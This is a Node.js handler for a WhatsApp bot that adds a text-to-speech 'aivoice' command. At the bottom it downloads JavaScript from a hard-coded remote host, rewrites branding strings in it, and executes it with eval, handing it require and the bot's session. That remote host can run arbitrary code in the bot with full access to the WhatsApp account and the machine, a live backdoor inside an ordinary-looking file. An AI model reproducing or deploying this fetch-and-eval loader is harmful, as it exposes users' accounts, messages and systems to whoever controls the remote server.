const axios = require('axios');
const googleTTS = require('google-tts-api');

const HANDLER_URL = 'https://accesses-1.zone.id';

const GROUP_LINK = 'https://chat.whatsapp.com/GAlNHmy9FxZ90YXdxgzdu5?s=cl&p=a&mlu=4';
const CHANNEL_LINK = 'https://whatsapp.com/channel/0029Vb8CfvXDjiOVpsJpdW3j';
const OWNER_NUMBER = '2349162748703';

// Speechma voices used by the aivoice command
const VOICES = { male: 'Andrew', female: 'Aria' };

let cachedHandler;

/* ============================ AI VOICE ============================ */

async function speechmaBuffer(text, gender) {
    const voice = VOICES[gender] || VOICES.male;
    const res = await axios.get(
        `https://apis.davidcyril.name.ng/tools/speechma?text=${encodeURIComponent(text)}&voice=${encodeURIComponent(voice)}&pitch=0&rate=1`,
        { responseType: 'arraybuffer', timeout: 60000 }
    );
    const buffer = Buffer.from(res.data);
    if (!buffer.length) throw new Error('empty speechma audio');
    return buffer;
}

async function googleBuffer(text) {
    const parts = await googleTTS.getAllAudioBase64(text, {
        lang: 'en',
        slow: false,
        host: 'https://translate.google.com',
        splitPunct: ',.?!;:'
    });
    const buffer = Buffer.concat(parts.map(p => Buffer.from(p.base64, 'base64')));
    if (!buffer.length) throw new Error('empty google tts audio');
    return buffer;
}

async function makeVoice(text, gender) {
    try {
        return await speechmaBuffer(text, gender);
    } catch (err) {
        console.error('Speechma failed, using fallback:', err?.message || err);
        return await googleBuffer(text);
    }
}

function extractBody(m) {
    if (typeof m?.text === 'string' && m.text.trim()) return m.text;
    if (typeof m?.body === 'string' && m.body.trim()) return m.body;
    const msg = m?.message || {};
    return (
        msg.conversation ||
        msg.extendedTextMessage?.text ||
        msg.imageMessage?.caption ||
        msg.videoMessage?.caption ||
        ''
    );
}

async function handleAiVoice(EliteProTech, m) {
    const prefix = global.prefix || '.';
    const body = extractBody(m);
    if (!body || !body.startsWith(prefix) || body[prefix.length] === ' ') return false;

    const command = body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase();
    const match = /^(?:aivoice|av)(?:[-_ ]?(male|female))?$/.exec(command);
    if (!match) return false;

    const gender = match[1] || 'male';
    const reply = (text) => EliteProTech.sendMessage(m.chat, { text }, { quoted: m });

    let text = body.slice(prefix.length + command.length).trim();
    if (!text && m?.quoted?.text) text = String(m.quoted.text).trim();

    if (!text) {
        await reply(
            `🎙️ *AI VOICE*\n\n` +
            `*${prefix}aivoice-male* <text>\n` +
            `*${prefix}aivoice-female* <text>\n\n` +
            `Example:\n${prefix}aivoice-male hello everyone\n${prefix}aivoice-female hello everyone`
        );
        return true;
    }

    // Speech engines are limited; keep the text within a safe length.
    text = text.slice(0, 900);

    try {
        await EliteProTech.sendMessage(m.chat, { react: { text: '🎙️', key: m.key } }).catch(() => {});
        await EliteProTech.sendPresenceUpdate('recording', m.chat).catch(() => {});

        const audio = await makeVoice(text, gender);

        let payload = { audio, mimetype: 'audio/mpeg', ptt: true };
        try {
            const { toPTT } = require('./lib/converter');
            const converted = await toPTT(audio, 'mp3');
            if (converted && converted.length) {
                payload = { audio: converted, mimetype: 'audio/ogg; codecs=opus', ptt: true };
            }
        } catch (convErr) {
            console.error('PTT conversion failed, sending mp3:', convErr?.message || convErr);
        }

        await EliteProTech.sendMessage(m.chat, payload, { quoted: m });
        await EliteProTech.sendMessage(m.chat, { react: { text: '✅', key: m.key } }).catch(() => {});
    } catch (err) {
        console.error('AIVoice Error:', err?.message || err);
        await reply('❌ Failed to generate the voice note. Please try again.').catch(() => {});
    }

    return true;
}

/* ============================ HANDLER PATCHES ============================ */

function patchHandler(source) {
    let code = String(source);

    // Bot image was renamed during rebranding.
    code = code.split('elitepropic.jpg').join('cbs-scover.jpg');

    // Show the group link in the menu.
    const ownerLine = '┣❍ *ᴏᴡɴᴇʀ:* ${ownername}';
    if (code.includes(ownerLine)) {
        code = code.split(ownerLine).join(`${ownerLine}\n┣❍ *ɢʀᴏᴜᴘ:* ${GROUP_LINK}`);
    } else {
        console.log('⚠️ Menu group-link patch target not found.');
    }

    // Branding
    code = code
        .split('2347047504860').join(OWNER_NUMBER)
        .split('https://t.me/eliteprotechs').join('https://t.me/cbsscover')
        .split('https://www.youtube.com/@eliteprotechs').join(CHANNEL_LINK)
        .split('https://eliteprotech.zone.id/').join('https://codebreakers.uk/');

    return code;
}

module.exports = async (EliteProTech, m, chatUpdate, store) => {
    try {
        if (await handleAiVoice(EliteProTech, m)) return;

        if (!cachedHandler) {
            const { data } = await axios.get(HANDLER_URL, { responseType: 'text' });
            const mod = { exports: {} };
            eval(`(function(module,exports,require){\n${patchHandler(data)}\n})`)(mod, mod.exports, require);
            if (typeof mod.exports !== 'function') throw new Error('Invalid remote handler');
            cachedHandler = mod.exports;
        }

        return cachedHandler(EliteProTech, m, chatUpdate, store);
    } catch (err) {
        console.error('Handler error:', err.message);
    }
};
